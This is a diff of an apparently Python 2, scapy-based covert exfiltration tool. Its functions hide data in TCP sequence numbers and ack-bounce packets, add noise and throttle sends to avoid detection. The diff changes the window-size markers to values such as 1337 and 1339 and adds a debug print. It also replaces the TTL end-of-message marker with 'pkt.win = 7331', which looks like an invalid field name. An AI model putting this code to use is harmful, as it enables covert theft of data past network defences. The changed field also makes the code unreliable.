@@ -181,7 +181,7 @@ def is_32bit(x):
 # Set the ttl=60 to indicate end-of-message
 def send_eom():
     print '[*] Sending End-Of-Message'
-    pkt.ttl = 60
+    pkt.win = 7331
     send(pkt)
 
 
@@ -296,14 +296,14 @@ def exfil_ipid():
 # Send message using initial sequence numbers. Add noise.
 def exfil_iseq():
     i = 0
-    k = 8192  # window size
     for c in exfilArray:
         add_n0ise_iseq(i)
-        pkt.window = k
+        pkt.window = 1337
         pkt.seq = exfilArray[i]
         # slow our roll
         time.sleep(0.4)
         try:
+            print '[window] ' + str(pkt.window)
             send(pkt)
         except socket.error:
             print "\nERROR: Problem sending packets, are you root?\n"
@@ -315,12 +315,11 @@ def exfil_iseq():
 def exfil_bounce():
     print '[*] Attempting Ack sequence number bounce exfil..'
     i = 0
-    k = 8192
     for c in exfilArray:
         # Can we use exfil_iseq instead.. by creating the packet with the
         # appropriate header fields set?
         add_n0ise_iseq(i)
-        pkt.window = k
+        pkt.window = 1339
         pkt.seq = exfilArray[i]
         time.sleep(0.4)
         try:
